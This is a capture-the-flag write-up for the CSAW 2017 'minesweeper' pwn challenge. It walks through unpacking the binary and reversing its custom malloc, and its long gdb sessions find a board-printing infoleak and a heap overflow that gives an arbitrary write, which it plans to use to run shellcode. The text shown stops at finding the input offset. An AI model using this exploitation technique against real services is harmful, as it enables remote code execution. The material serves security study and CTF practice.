# Minesweeper pwn 500 CSAW 2017

This writeup is based off of: https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2017/pwn/minesweeper/sudhackar/README.md

So we are given this elf, we see that it is a 32 bit elf. When we run it, it says it starts a server:

```
$	./minesweeper 
Server started
```

A quick look through the output of the `netstat -planet` (lists all network connections) will tell us that it is listening on port `31337` (port `31337` ins't typically used and is also leet speak, so it stuck out like a sore thumb):

```
$	netstat -planet | grep 31337
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      1000       396966      29296/minesweeper
```

 When we connect to it, we see that we are given a menu that allows us to play a game. When we throw it in ida, it looks really wierd. As I was going through the strings, I found a string stating that it was packed with UPX. I just grabbed a copy of it from `https://upx.github.io/` and unpacked it:
 
```
 $	./upx -d minesweeper 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     13132 <-      7936   60.43%   linux/i386    minesweeper

Unpacked 1 file.
```

When we load the unpacked version into ida, it looks much more reader friendly, and easier to reverse. 

## Reversing

#### Main Function

So we start off by looking at the main function, We see that it essentially handles the process of listening for new connections, then forking over the process which handles the connection. We can see that with the following code from `main`:

```
              pid = fork();
              if ( pid == -1 )
              {
                perror("fork");
                close(connection);
              }
              else
              {
                if ( !pid )
                {
                  alarm(0xF4240u);
                  close(fd);
                  fwrite("New user connected", 1u, 0x12u, stderr);
                  status = runNewGameFunc(connection);
                  close(connection);
                  _exit(status);
                }
                close(connection);
              }
```

 Also with this code, we can see that the function that essentially handles clients is `runNewGameFunc`. When we look at that function, we see that it just passes the argument to a new function, which that function is what actually handles the client session (I called this function that `runNewGameFunc` calls `gameMenuFunc`).  
 
 With `gameMenuFunc`, we can see that it essentially prompts us for `16` bytes of input (might be wrong on the exact quantity of bytes). Then it will iterate through our input untill it reaches one of the following characters (`N`, `n`, `I`, `i`, `Q`, `q`). If it is one of the first two, it will run the `newGameFunc` function, if it is the second two it is the `initialize_board` function, and if it is the last two characters it just exits the while loop:
 
```
   while ( 1 )
  {
    custom_print(
      connection,
      (int)"\n"
           "Hi. Welcome to Minesweeper. Please select an option:\n"
           "1) N (New Game)\n"
           "2) Initialize Game(I)\n"
           "3) Q (Quit)\n");
    recvResults = recv_func(connection, input, 16);
    if ( recvResults == 0xFFFFFFFF )
      break;
    for ( i = 0; i <= 0xF && (input[i] == 32 || !input[i]); ++i )
      ;
    if ( i == 16 )
    {
      custom_print(connection, (int)"No command string entered! N, I, or Q please!\n");
    }
    else
    {
      switch ( input[i] )
      {
        case 'N':
        case 'n':
          newGameFunc(connection, (int)boardPtr, x, y);
          continue;
        case 'I':
        case 'i':
          boardPtr = initialize_board(connection, (int)&x, (int)&y);
          continue;
        case 'Q':
        case 'q':
          custom_print(connection, (int)"Goodbye!\n");
          return 0;
        default:
          custom_print(connection, (int)"Invalid option, please try again N, I, or Q please!\n");
          break;
      }
    }
  }
```
Welcome. The board has been initialized to have a random *mine*placed in the midst. Your job is to uncover it. You can:
```
1) View Board (V)
2) Uncover a location (U X Y). Zero indexed.
3) Quit game (Q)
```

#### Initialize Board

When we initialize a board, it prompts us for two different things. The first is the `x` and `y` coordinates of the board in the form `B X Y`. The second is the string for the board itself, with the character `X` placed in it, that is `X * Y` (the area of a board) characters long. Also there is a custom malloc which it uses to allocate space for the board. However there is a bit of an error with the amount of space it allocates for our board, which causes a segmention falut:


Server Side:
```
gdb-peda$ b *0x80493f9
Breakpoint 1 at 0x80493f9
gdb-peda$ r
Starting program: /Hackery/csaw17/pwn/minesweeper/minesweeper 
Server started[New process 8589]
New user connecteddelinked![Switching to process 8589]




[----------------------------------registers-----------------------------------]
EAX: 0x51 ('Q')
EBX: 0x0 
ECX: 0xa ('\n')
EDX: 0x9 ('\t')
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 --> 0x0 
ESP: 0xffffce50 --> 0x51 ('Q')
EIP: 0x80493f9 (call   0x804987d)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80493f2:	imul   eax,edx
   0x80493f5:	sub    esp,0xc
   0x80493f8:	push   eax
=> 0x80493f9:	call   0x804987d
   0x80493fe:	add    esp,0x10
   0x8049401:	mov    DWORD PTR [ebp-0x14],eax
   0x8049404:	mov    eax,DWORD PTR [ebp-0x18]
   0x8049407:	lea    edx,[eax-0x1]
Guessed arguments:
arg[0]: 0x51 ('Q')
[------------------------------------stack-------------------------------------]
0000| 0xffffce50 --> 0x51 ('Q')
0004| 0xffffce54 --> 0x804c024 ("  +", '-' <repeats 27 times>, "+", '-' <repeats 27 times>, "+\n  |      ", '_' <repeats 18 times>, "   |", ' ' <repeats 27 times>, "|\n  |  ==c(______(o(______(_()  | |", ''' <repeats 12 times>, "|======[***  |\n  |", ' ' <repeats 13 times>, ")=\\ "...)
0008| 0xffffce58 --> 0x3e8 
0012| 0xffffce5c --> 0xf7e8f420 (push   edi)
0016| 0xffffce60 ("B 10 10")
0020| 0xffffce64 --> 0x303120 (' 10')
0024| 0xffffce68 --> 0xf7fb2000 --> 0x1b1db0 
0028| 0xffffce6c --> 0x8049aae (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "minesweeper" hit Breakpoint 1, 0x080493f9 in ?? ()
gdb-peda$ c
Continuing.
delinked!Allocated buffer of size: 81
Thread 2.1 "minesweeper" received signal SIGSEGV, Segmentation fault.



















[----------------------------------registers-----------------------------------]
EAX: 0x30303030 ('0000')
EBX: 0x0 
ECX: 0x4 
EDX: 0x30303030 ('0000')
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce08 --> 0xffffce48 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 (--> ...)
ESP: 0xffffcdf0 --> 0x0 
EIP: 0x8049855 (mov    DWORD PTR [eax+0x8],edx)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804984c:	mov    eax,DWORD PTR [ebp+0x8]
   0x804984f:	mov    eax,DWORD PTR [eax+0x4]
   0x8049852:	mov    edx,DWORD PTR [ebp-0xc]
=> 0x8049855:	mov    DWORD PTR [eax+0x8],edx
   0x8049858:	mov    eax,DWORD PTR [ebp+0x8]
   0x804985b:	mov    eax,DWORD PTR [eax+0x8]
   0x804985e:	mov    edx,DWORD PTR [ebp-0x10]
   0x8049861:	mov    DWORD PTR [eax+0x4],edx
[------------------------------------stack-------------------------------------]
0000| 0xffffcdf0 --> 0x0 
0004| 0xffffcdf4 --> 0xf7fb2000 --> 0x1b1db0 
0008| 0xffffcdf8 ("00000000\004")
0012| 0xffffcdfc ("0000\004")
0016| 0xffffce00 --> 0x4 
0020| 0xffffce04 --> 0x804c024 ("XXXXX", '0' <repeats 79 times>, "\022")
0024| 0xffffce08 --> 0xffffce48 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 (--> ...)
0028| 0xffffce0c --> 0x80499ea (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08049855 in ?? ()
gdb-peda$ p $eax+0x8
$2 = 0x30303038
gdb-peda$ p $edx
$3 = 0x30303030
```

Client Side:

```
nc 127.0.0.1 31337

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
I
Please enter in the dimensions of the board you would like to set in this format: B X Y
B 10 10
HI THERE!!
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""". 
  II     6.     .P  :  .' / | \ `.  : 
  II     'T;. .;P'  '.'  /  |  \  `.' 
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X
XXXXX00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

So we can see that we specified a board size of `100` (`x` and `y` coordinates both being `10`), yet when the call to the custom malloc at `0x80493f9` was made, it was passed the argument `0x51` (`81`). We also see that on the server side, it only unlinked `81` bytes to store our input in (hence an overflow). Also we were able to cause a crash the program (in the `delink` function discussed in the custom malloc section), since we were able to overwrite values that were used in a write at `0x8049855`. We can see that it is moving the value of the `edx` register into the region of memory with a ptr in `eax+0x8`. Upon looking at both of those, we can see that we were able to overwrite both of them with `0x30`s (`0`s). As a result we have a write what where here. Also we should cover how the custom malloc works.

#### Custom Malloc

The program stores the board in the heap, however it uses a custom malloc in order to accomplish this task.

This malloc works off of 12 byte chunks. Starting off, it figures out how many 12 byte chunks to use:

```
  ptr = 0;
  chunks = (size + 11) / 0xCu + 1;
```

The addresses start of the heap, and end of the allocated space are stored in memory at `0x804bdc8` (I named it `heapBounds`). Also a pointer to this address is stored at `0x804bdc4` (I named it `heapBoundsPtr`). We can see that it set's that up, the first time that malloc is called:

```
  if ( !heapBoundsPtr )
  {                                             // This loop only runs when malloc is first called
    heapBoundsPtr = (int)&heapBounds;
    heapBounds = 0;
    *((_DWORD *)&heapBounds + 1) = &heapBounds;
    *(_DWORD *)(heapBoundsPtr + 8) = heapBoundsPtr;
  }
```

The next chunk of code iterates for the next chunk that will get allocated. The value stored in `ptr` should be a pointer to the amount of free `12` byte chunks left. Also if this is the first time the custom malloc is being called, the loop doesn't run due to the for loop condition for exiting being met.

```
  for ( i = *(_DWORD *)(heapBoundsPtr + 4); i != heapBoundsPtr; i = *(_DWORD *)(i + 4) )
  {
    if ( *(_WORD *)i >= chunks )
    {
      ptr = i;
      break;
    }
  }
```

This next chunk of code I'm pretty sure is for when the amount of `12` byte chunks being allocated is equal to the number of free `12` byte chunks, For our purposes, we don't need to worry about this (this code doesn't run durring our exploit):

```
  if ( ptr && *(_WORD *)ptr == chunks )
  {
    delink(ptr);
    return ptr + 12;
  }
```

This next chunk of code is what is responsible for requesting memory from the OS for malloc, with the `sbrk` function (`0x1000` bytes). It should only run the first time the custom malloc is called:

```
  if ( !ptr )                                   // Executes when custom malloc is called for first time. Requests 4096 bytes for heap with sbrk call.
  {
    sbrkPtr = sbrk(0x1000);
    if ( sbrkPtr == (_WORD *)0xFFFFFFFF )
      return 0xFFFFFFFF;
    ptr = (int)sbrkPtr;
    *sbrkPtr = 0x155;
  }
``` 

It starts off by setting the spot where the next chunk will be equal to the amount of remaining `12` byte chunks. It then sets the memory pointed to by `ptr` (previously held the amount of remaining free chunks) equal to the amount of `12` byte chunks which this chunk has. Proceeding that, it runs the `delink` function on `ptr`, which writes the pointers to the other chunks. The write what where discussed earlier that crashes the code happens on the sixth line of this function:

```
size_t __cdecl delink(int ptr)
{
  int v1; // ST18_4@1

  v1 = *(_DWORD *)(ptr + 4);
  *(_DWORD *)(*(_DWORD *)(ptr + 4) + 8) = *(_DWORD *)(ptr + 8);
  *(_DWORD *)(*(_DWORD *)(ptr + 8) + 4) = v1;
  return fwrite("delinked!", 1u, 9u, stderr);
}
```

After that function, the function `prtWrite` is also called, with then end of the chunk we are allocating as the argument. It essentially just writes pointers to other chunks, for this chunk. Putting it all together, we get this code segment for this part of the custom malloc:

```
  if ( ptr && *(_WORD *)ptr > chunks )
  {
    *(_WORD *)(12 * chunks + ptr) = *(_WORD *)ptr - chunks;
    *(_WORD *)ptr = chunks;
    if ( *(_DWORD *)(ptr + 4) )
    {
      if ( *(_DWORD *)(ptr + 8) )
        delink(ptr);
    }
    ptrWrite(12 * chunks + ptr);
    result = ptr + 12;
  }
```

after that, it just returns result (or `0xffffffff` if the previous if then statment didn't execute). Also another interesting thing about the custom malloc, we can see that the heap memory segment (between `0x0804c000` and `0x804d000`) has the permissions `rwxp` (we can read, write, and execute code in it):

```
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x0804b000 r-xp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804b000 0x0804c000 rwxp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804c000 0x0804d000 rwxp	[heap]
0xf7dff000 0xf7e00000 rwxp	mapped
0xf7e00000 0xf7fb0000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb0000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb6000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

#### New Game

For the function `newGameFunc` it is ran with four arguments. The first is the file descriptor for the connection. The second is a pointer to the board. The third and four parameter are integers representing the `x` and `y` coordinates.  When we enter the function, we see that it gives us the following options:

```
Welcome. The board has been initialized to have a random *mine*placed in the midst. Your job is to uncover it. You can:
1) View Board (V)
2) Uncover a location (U X Y). Zero indexed.
3) Quit game (Q)
```

however when we view an unintialized board, we see something interesting happen:

```
Welcome. The board has been initialized to have a random *mine*placed in the midst. Your job is to uncover it. You can:
1) View Board (V)
2) Uncover a location (U X Y). Zero indexed.
3) Quit game (Q)
V
OOOOO
OOOOO
OOOOO
OOOOO
OOXOO
V


���
���






���
����
��
����






```

We probably have an infoleak here with the view board functionallity. When we take a look at the code that executes when we input `v`, we see this:

```
    case 'V':
    case 'v':
      printBoard(connection, boardPtrTrnsf, xtrns, ytrns);
      goto LABEL_14;
``` 

So the `printBoard` function is what handles printing the board. Looking at the code for `printBoard`, we can see how it runs:
```
int __cdecl printBoard(int connection, int boardPtr, size_t x, int y)
{
  int result; // eax@3
  char dest[10000]; // [sp+Ch] [bp-271Ch]@1
  int i; // [sp+271Ch] [bp-Ch]@1

  initialize((int)dest, 0, 10000);
  for ( i = 0; ; ++i )
  {
    result = y * y;
    if ( y * y <= i )
      break;
    memcpy(dest, (const void *)(i * x + boardPtr), x);
    dest[x] = 10;
    send_func(connection, (int)dest, x + 1);
  }
  return result;
}
```

So it starts off by initializng the `dest` char array to zero. We can also see that this loop will run `y^2` times (`y` is the y coordinate for the grid). For each iteration, it will essentially take `x` bytes from the location from the board (pointed to by `boardPtr`), append a newline character to it, and send it. Each sequential send sends the bytes after the last. So if the coordinates were `5, 5`, it would print the first `5` bytes of the board, then the second `5` bytes, and so on. The issue with this is it sends `y^2` lines by `x`, which means it will send more data then what the board is (it should just send `y` lines). As a result here, we have an infoleak bug. 

## Exploitation

So we have identified an infoleak bug, and a write what where bug. Also we are able to store shellcode in an executable region of memory (the heap). The exploitation process will be the following:

*	Leak addresses for the stack and the heap
*	Store shellcode in heap, overwrite return address to point to beginning of shellcode in heap
*	Return and get remote code execution

#### Stack Infoleak

So in order to do this, we will need a stack and heap infoleak. We will use the infoleak bug in the viewing board feature to acheive this. Starting let's just set a breakpoint for when the `printBoard` function is called to see the board, followed by a breakpoint for when the `printBoard` function actually sends the individual lines:

```
gdb-peda$ b *0x8048b7c
Breakpoint 1 at 0x8048b7c
gdb-peda$ b *0x804894d
Breakpoint 2 at 0x804894d
gdb-peda$ r
Starting program: /Hackery/csaw17/pwn/minesweeper/minesweeper 
Server started[New process 9460]
New user connected[Switching to process 9460]
```

And when we get to the first breakpoint, we can see the layout of the board:

```
[-------------------------------------code-------------------------------------]
   0x8048b73:	push   DWORD PTR [ebp-0x10]
   0x8048b76:	push   DWORD PTR [ebp-0xc]
   0x8048b79:	push   DWORD PTR [ebp+0x8]
=> 0x8048b7c:	call   0x80488db
   0x8048b81:	add    esp,0x10
   0x8048b84:	jmp    0x804904a
   0x8048b89:	add    DWORD PTR [ebp-0x18],0x1
   0x8048b8d:	cmp    DWORD PTR [ebp-0x18],0x10
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0xffffce3b ("X", 'O' <repeats 24 times>, "V")
arg[2]: 0x5 
arg[3]: 0x5 
[------------------------------------stack-------------------------------------]
0000| 0xffffce20 --> 0x4 
0004| 0xffffce24 --> 0xffffce3b ("X", 'O' <repeats 24 times>, "V")
0008| 0xffffce28 --> 0x5 
0012| 0xffffce2c --> 0x5 
0016| 0xffffce30 --> 0x4 
0020| 0xffffce34 --> 0x4ff11163 
0024| 0xffffce38 --> 0x58ef3c19 
0028| 0xffffce3c ('O' <repeats 24 times>, "V")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "minesweeper" hit Breakpoint 1, 0x08048b7c in ?? ()
gdb-peda$ x/16g 0xffffce3b
0xffffce3b:	0x4f4f4f4f4f4f4f58	0x4f4f4f4f4f4f4f4f
0xffffce4b:	0x4f4f4f4f4f4f4f4f	0x000000000000564f
0xffffce5b:	0x0000000000000000	0xfb2000f7ffd91800
0xffffce6b:	0x00000300000002f7	0x0000190000000000
0xffffce7b:	0x0000000000000000	0x0000050000000500
0xffffce8b:	0xfb2cc0ffffce3b00	0xffcee800000000f7
0xffffce9b:	0x00000408049698ff	0x0000000000000000
0xffffceab:	0x0000010000000000	0x0000000000000100
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x0804b000 r-xp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804b000 0x0804c000 rwxp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0xf7dff000 0xf7e00000 rwxp	mapped
0xf7e00000 0xf7fb0000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb0000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb6000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

So we can see that the paramters of the board are `5 by 5` (passed in `arg[2]` and `arg[3]`). This means that it will print `25` lines (`5^2 = 25`). Looking at the data after the board that will be printed, we see the pointer `0xffffce3b` (we can tell it is off by one since the pointer after it spills over the ). When we take a look at the memory regions, we see that that pointer is from the stack (which ranges from `0xfffdd000` to `0xffffe000`). 

and on the sevententh iteration of the `printBoard` function sending a line at `0x804894d`, we see that it sends the first three bytes of the stack pointer (the most signifcant byte is sent in the proceeding send):

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffa6fc --> 0xffce3b00 
EBX: 0x0 
ECX: 0x5 
EDX: 0xffffa6fc --> 0xffce3b00 
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce18 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 --> 0x0 
ESP: 0xffffa6e0 --> 0x4 
EIP: 0x804894d (call   0x8049ad3)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048943:	lea    eax,[ebp-0x271c]
   0x8048949:	push   eax
   0x804894a:	push   DWORD PTR [ebp+0x8]
=> 0x804894d:	call   0x8049ad3
   0x8048952:	add    esp,0x10
   0x8048955:	add    DWORD PTR [ebp-0xc],0x1
   0x8048959:	mov    eax,DWORD PTR [ebp+0x14]
   0x804895c:	imul   eax,DWORD PTR [ebp+0x14]
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0xffffa6fc --> 0xffce3b00 
arg[2]: 0x6 
[------------------------------------stack-------------------------------------]
0000| 0xffffa6e0 --> 0x4 
0004| 0xffffa6e4 --> 0xffffa6fc --> 0xffce3b00 
0008| 0xffffa6e8 --> 0x6 
0012| 0xffffa6ec --> 0x0 
0016| 0xffffa6f0 --> 0x0 
0020| 0xffffa6f4 --> 0x0 
0024| 0xffffa6f8 --> 0x0 
0028| 0xffffa6fc --> 0xffce3b00 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "minesweeper" hit Breakpoint 2, 0x0804894d in ?? ()
gdb-peda$ 
```

#### Heap Infoleak

The next infoleak we will need will be from the heap. Luckily for us, as a part of the custom malloc, there are heap pointers stored near our board which will be printed. This is using the same breakpoints as the Stack infoleak, and with an initialized `5 X 5` board containning 5 `X`s and 20 `0`s:

```
[----------------------------------registers-----------------------------------]
EAX: 0x8048b70 (push   DWORD PTR [ebp-0x14])
EBX: 0x0 
ECX: 0x4 
EDX: 0xffffce54 --> 0x56 ('V')
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 --> 0x0 
ESP: 0xffffce20 --> 0x4 
EIP: 0x8048b7c (call   0x80488db)
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048b73:	push   DWORD PTR [ebp-0x10]
   0x8048b76:	push   DWORD PTR [ebp-0xc]
   0x8048b79:	push   DWORD PTR [ebp+0x8]
=> 0x8048b7c:	call   0x80488db
   0x8048b81:	add    esp,0x10
   0x8048b84:	jmp    0x804904a
   0x8048b89:	add    DWORD PTR [ebp-0x18],0x1
   0x8048b8d:	cmp    DWORD PTR [ebp-0x18],0x10
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0x804c024 ("XXXXX", '0' <repeats 19 times>, "\022")
arg[2]: 0x5 
arg[3]: 0x5 
[------------------------------------stack-------------------------------------]
0000| 0xffffce20 --> 0x4 
0004| 0xffffce24 --> 0x804c024 ("XXXXX", '0' <repeats 19 times>, "\022")
0008| 0xffffce28 --> 0x5 
0012| 0xffffce2c --> 0x5 
0016| 0xffffce30 --> 0x4 
0020| 0xffffce34 --> 0x804a704 ("\nHi. Welcome to Minesweeper. Please select an option:\n1) N (New Game)\n2) Initialize Game(I)\n3) Q (Quit)\n")
0024| 0xffffce38 --> 0xef3c19 
0028| 0xffffce3c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "minesweeper" hit Breakpoint 1, 0x08048b7c in ?? ()
gdb-peda$ x/x 0x804c024
0x804c024:	0x58585858
gdb-peda$ x/20g 0x804c024
0x804c024:	0x3030305858585858	0x3030303030303030
0x804c034:	0x3030303030303030	0x0804c1142d2d0012
0x804c044:	0x5f5f5f5f0804c000	0x5f5f5f5f5f5f5f5f
0x804c054:	0x6173776f63203c0a	0x6e696d20333c2079
0x804c064:	0x7265706565777365	0x2d2d2d2d200a3e20
0x804c074:	0x2d2d2d2d2d2d2d2d	0x2020202020202020
0x804c084:	0x20202020200a2020	0x5f2c2020205c2020
0x804c094:	0x2020202020202c5f	0x20202020200a2020
0x804c0a4:	0x6f2820205c202020	0x20205f5f5f5f296f
0x804c0b4:	0x20202020200a2020	0x5f28202020202020
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x0804b000 r-xp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804b000 0x0804c000 rwxp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804c000 0x0804d000 rwxp	[heap]
0xf7dff000 0xf7e00000 rwxp	mapped
0xf7e00000 0xf7fb0000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb0000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb6000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

We cam see that there is a pointer to the beginning of the heap `0x0804c000`. Going through the execution of the function, we can see that it prints that pointer on the seventh line, however the halves of it are backwards (we can fix that in the exploit):

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffa6fc --> 0xc0000804 
EBX: 0x0 
ECX: 0x5 
EDX: 0xffffa6fc --> 0xc0000804 
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce18 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 --> 0x0 
ESP: 0xffffa6e0 --> 0x4 
EIP: 0x804894d (call   0x8049ad3)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048943:	lea    eax,[ebp-0x271c]
   0x8048949:	push   eax
   0x804894a:	push   DWORD PTR [ebp+0x8]
=> 0x804894d:	call   0x8049ad3
   0x8048952:	add    esp,0x10
   0x8048955:	add    DWORD PTR [ebp-0xc],0x1
   0x8048959:	mov    eax,DWORD PTR [ebp+0x14]
   0x804895c:	imul   eax,DWORD PTR [ebp+0x14]
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0xffffa6fc --> 0xc0000804 
arg[2]: 0x6 
[------------------------------------stack-------------------------------------]
0000| 0xffffa6e0 --> 0x4 
0004| 0xffffa6e4 --> 0xffffa6fc --> 0xc0000804 
0008| 0xffffa6e8 --> 0x6 
0012| 0xffffa6ec --> 0x0 
0016| 0xffffa6f0 --> 0x0 
0020| 0xffffa6f4 --> 0x0 
0024| 0xffffa6f8 --> 0x0 
0028| 0xffffa6fc --> 0xc0000804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 2.1 "minesweeper" hit Breakpoint 1, 0x0804894d in ?? ()
```

#### Write What Where

##### Input Offset

Now that we have to figure out the offset fromt he start of our input in the heap is untill we start writing to the memory stored in `eax+0x8` and `edx` for the write what where. I did this by sending it a string structured that we can tell the offset of a substring just by it's value. The string I chose was just `"X"*5 + "z"*55 + "0"*4 + "1"*4 + "2"*4 + "3"*4 + "4"*4 + "5"*4 + "6"*4 + "7"*4 + "8"*4 + "9"*4` (there are utillities that will automoate this task). When we get to the crash we can see the values:

```
[----------------------------------registers-----------------------------------]
EAX: 0x37373737 ('7777')
EBX: 0x0 
ECX: 0x8 
EDX: 0x38383838 ('8888')
ESI: 0xf7fb2000 --> 0x1b1db0 
EDI: 0xf7fb2000 --> 0x1b1db0 
EBP: 0xffffce08 --> 0xffffce48 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 (--> ...)
ESP: 0xffffcdf0 --> 0x0 
EIP: 0x8049855 (mov    DWORD PTR [eax+0x8],edx)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804984c:	mov    eax,DWORD PTR [ebp+0x8]
   0x804984f:	mov    eax,DWORD PTR [eax+0x4]
   0x8049852:	mov    edx,DWORD PTR [ebp-0xc]
=> 0x8049855:	mov    DWORD PTR [eax+0x8],edx
   0x8049858:	mov    eax,DWORD PTR [ebp+0x8]
   0x804985b:	mov    eax,DWORD PTR [eax+0x8]
   0x804985e:	mov    edx,DWORD PTR [ebp-0x10]
   0x8049861:	mov    DWORD PTR [eax+0x4],edx
[------------------------------------stack-------------------------------------]
0000| 0xffffcdf0 --> 0x0 
0004| 0xffffcdf4 --> 0xf7fb2000 --> 0x1b1db0 
0008| 0xffffcdf8 ("77778888\004")
0012| 0xffffcdfc ("8888\004")
0016| 0xffffce00 --> 0x4 
0020| 0xffffce04 --> 0x804c048 ("XXXXX", 'z' <repeats 55 times>, "000011112222333344445555\022")
0024| 0xffffce08 --> 0xffffce48 --> 0xffffce98 --> 0xffffcee8 --> 0xffffcf08 --> 0xffffcf58 (--> ...)
0028| 0xffffce0c --> 0x80499ea (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08049855 in ?? ()
gdb-peda$ p $edx
$1 = 0x38383838
gdb-peda$ p $eax+0x8
$2 = 0x3737373f
```

